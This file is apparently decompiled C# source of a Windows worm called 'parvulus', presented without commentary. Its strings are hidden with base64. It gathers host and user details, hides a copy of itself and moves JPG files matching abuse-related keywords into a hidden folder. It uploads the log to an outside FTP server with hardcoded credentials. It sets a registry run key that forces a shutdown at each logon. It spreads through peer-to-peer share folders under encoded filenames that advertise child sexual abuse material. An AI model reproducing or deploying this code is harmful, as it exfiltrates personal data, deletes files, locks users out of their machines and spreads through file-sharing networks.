using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;
using Retro.FTP;

namespace parvulus;

internal static class Program
{
	private static object g;

	private static Module me;

	[STAThread]
	private static void Main()
	{
		ArrayList arrayList = new ArrayList();
		FTPClient fTPClient = new FTPClient();
		Random random = new Random();
		DateTime now = DateTime.Now;
		ProcessStartInfo startInfo = new ProcessStartInfo("shutdown.exe", "-f");
		string text = RandName(".txt");
		string text2 = Environment.SystemDirectory.ToString();
		int num = 0;
		string[] array = new string[10]
		{
			decrypt("cHRoYw=="),
			decrypt("UGhvdG8gQnkgQ2FybCAtIFBlZG8="),
			decrypt("cHJldGVlbg=="),
			decrypt("Y2hpbGRsb3Zlcg=="),
			decrypt("Y2hpbGQgcG9ybg=="),
			decrypt("OHlv"),
			decrypt("OXlv"),
			decrypt("MTB5bw=="),
			decrypt("MTF5bw=="),
			decrypt("MTJ5bw==")
		};
		string hostName = Dns.GetHostName();
		IPHostEntry hostEntry = Dns.GetHostEntry(hostName);
		IPAddress[] addressList = hostEntry.AddressList;
		StreamWriter streamWriter = new StreamWriter(text2 + decrypt("XA==") + text);
		streamWriter.WriteLine(decrypt("W1BhcnZ1bHVzXSBBdXRvLUdlbmVyYXRlZCBPbiA=") + now.ToString("dddd, d MMMM yyyy H:m:s zzz \r\n"));
		streamWriter.WriteLine(decrypt("T1MgVmVyc2lvbiAgIDog") + Environment.OSVersion);
		streamWriter.WriteLine(decrypt("TWFjaGluZSBOYW1lIDog") + Environment.MachineName);
		streamWriter.WriteLine(decrypt("VXNlcm5hbWUgICAgIDog") + Environment.UserName);
		streamWriter.WriteLine(decrypt("SG9zdCBOYW1lICAgIDog") + hostName);
		for (int i = 0; i < addressList.Length; i++)
		{
			streamWriter.WriteLine(decrypt("SVAgQWRkcmVzcyB7MH0gOiB7MX0g"), i, addressList[i].ToString());
		}
		streamWriter.Write("\r\n\t\t\t\t" + decrypt("T3JpZ2luYWwgRmlsZSAtPiBCYWNrdXAgRmlsZQ==") + "\r\n\r\n");
		me = Assembly.GetExecutingAssembly().GetModules()[0];
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array2 = logicalDrives;
		foreach (string dir in array2)
		{
			try
			{
				CollectDirs(dir, arrayList);
			}
			catch (IOException)
			{
			}
		}
		int index = random.Next(0, arrayList.Count);
		File.Copy(me.FullyQualifiedName, string.Concat(arrayList[index], "\\", me.ScopeName));
		DirectoryInfo directoryInfo = new DirectoryInfo(string.Concat(arrayList[index], "\\", me.ScopeName));
		directoryInfo.Attributes = FileAttributes.Hidden;
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(decrypt("U29mdHdhcmVcUmV0cm9cUGFydmFsdXM="));
		registryKey.SetValue(decrypt("UGFydnVsdXM="), string.Concat(arrayList[index], "\\", me.ScopeName));
		registryKey.SetValue(decrypt("QWN0aXZl"), decrypt("MA=="));
		text2 = Environment.SystemDirectory.ToString();
		Directory.CreateDirectory(text2 + decrypt("XHBcYVxyXHZcdVxsXHVccw=="));
		DirectoryInfo directoryInfo2 = new DirectoryInfo(text2 + decrypt("XHA="));
		directoryInfo2.Attributes = FileAttributes.Hidden;
		foreach (string item in arrayList)
		{
			try
			{
				string[] files = Directory.GetFiles(item, "*.jpg");
				string[] array3 = files;
				foreach (string text3 in array3)
				{
					try
					{
						FileInfo fileInfo = new FileInfo(text3);
						for (int l = 0; l < 10; l++)
						{
							if (fileInfo.Name.Contains(array[l]))
							{
								registryKey.SetValue(decrypt("QWN0aXZl"), decrypt("MQ=="));
								string[] files2 = Directory.GetFiles(text2 + decrypt("XHBcYVxyXHZcdVxsXHVcc1w="));
								num = files2.Length;
								File.Copy(text3, text2 + decrypt("XHBcYVxyXHZcdVxsXHVcc1w=") + decrypt("aW1wZWRv") + num + ".jpg");
								File.Delete(text3);
								streamWriter.WriteLine(text3 + " -> " + text2 + decrypt("XHBcYVxyXHZcdVxsXHVcc1w=") + decrypt("aW1wZWRv") + num + ".jpg");
								num++;
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		streamWriter.Close();
		p2pShares();
		g = registryKey.GetValue(decrypt("QWN0aXZl"));
		if (g.ToString() == decrypt("MQ=="))
		{
			Application.EnableVisualStyles();
			Application.Run((Form)(object)new Form1());
		}
		fTPClient.setHost(decrypt("ZnRwLmhvc3Quc2s="));
		fTPClient.setPort(21);
		fTPClient.setUser(decrypt("cGFydnVsdXM="));
		fTPClient.setPass(decrypt("ZjQ1NTQ2NHBwOQ=="));
		fTPClient.login();
		fTPClient.chdir(decrypt("ZmlsZXM="));
		fTPClient.setBinaryMode(mode: true);
		fTPClient.upload(text2 + decrypt("XA==") + text);
		fTPClient.close();
		File.Delete(text2 + decrypt("XA==") + text);
		registryKey = Registry.LocalMachine.CreateSubKey(decrypt("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25ccG9saWNpZXNcZXhwbG9yZXJccnVu"));
		registryKey.SetValue(decrypt("c2h1dGRvd24="), decrypt("Y21kLmV4ZSAvYyBzaHV0ZG93biAtZg=="));
		Process.Start(startInfo);
		registryKey.Close();
	}

	private static string decrypt(string s)
	{
		StringBuilder stringBuilder = new StringBuilder();
		char[] input = s.ToCharArray();
		decrypter decrypter2 = new decrypter(input);
		byte[] decoded = decrypter2.GetDecoded();
		stringBuilder.Append(Encoding.UTF8.GetChars(decoded));
		return stringBuilder.ToString();
	}

	private static string RandName(string extension)
	{
		Random random = new Random();
		string text = null;
		int num = random.Next(5, 11);
		for (int i = 0; i < num; i++)
		{
			if (random.Next(1, 3) == 2)
			{
				text += Convert.ToChar(Convert.ToInt16(random.Next(97, 122)));
			}
			text += random.Next(0, 10);
		}
		return text + extension;
	}

	private static void CollectDirs(string dir, ArrayList storage)
	{
		try
		{
			string[] directories = Directory.GetDirectories(dir);
			string[] array = directories;
			foreach (string text in array)
			{
				storage.Add(text);
				CollectDirs(text, storage);
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	private static void p2pShares()
	{
		string[] array = new string[6]
		{
			decrypt("TXlfR2lybF85eW9fMDQyLmpwZy5leGU="),
			decrypt("cHRoY19wcmUtU2xpZGVzaG93Ljg3cGl4cy5qcGcuZXhl"),
			decrypt("UGVkbyAtIDIgMTN5byBnaXJsIG1hc3R1cmJhdGluZyAxNHlvIGJveS5qcGcuZXhl"),
			decrypt("cHJldGVlbiAtIEVtaWx5IDd5ciBwZWRvIGZ1Y2suanBnLmV4ZQ=="),
			decrypt("TkVXISAyX1BlZG8gUGVkb2ZpbGlhIEtpZHMgQ2hpbGQgUG9ybiA2NjYuanBnLmV4ZQ=="),
			decrypt("MiA5eW8gZ2lybHMgYW5kIDEyeW8gYm95LmpwZy5leGU=")
		};
		object obj = null;
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(decrypt("U09GVFdBUkVcREMrKw=="));
		obj = registryKey.GetValue(decrypt("SW5zdGFsbF9EaXI="));
		if (obj != null)
		{
			obj = string.Concat(obj, decrypt("XA=="));
			XmlReader xmlReader = XmlReader.Create(string.Concat(obj, decrypt("RENQbHVzUGx1cy54bWw=")));
			while (xmlReader.Read())
			{
				if (!(xmlReader.Name == decrypt("RGlyZWN0b3J5")))
				{
					continue;
				}
				string text = xmlReader.ReadString();
				if (Directory.Exists(text))
				{
					string[] array2 = array;
					foreach (string text2 in array2)
					{
						File.Copy(me.FullyQualifiedName, text + text2);
					}
				}
			}
			xmlReader.Close();
		}
		string text3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + decrypt("ZURvbmtleTIwMDAgRG93bmxvYWRzXA==");
		if (Directory.Exists(text3))
		{
			string[] array3 = array;
			foreach (string text4 in array3)
			{
				File.Copy(me.FullyQualifiedName, text3 + text4);
			}
		}
		registryKey = Registry.LocalMachine.OpenSubKey(decrypt("U09GVFdBUkVcS2F6YWFcTG9jYWxDb250ZW50"));
		obj = registryKey.GetValue(decrypt("RG93bmxvYWREaXI="));
		if (obj != null)
		{
			obj = string.Concat(obj, decrypt("XA=="));
			string[] array4 = array;
			foreach (string text5 in array4)
			{
				File.Copy(me.FullyQualifiedName, string.Concat(obj, text5));
			}
		}
		registryKey.Close();
	}
}
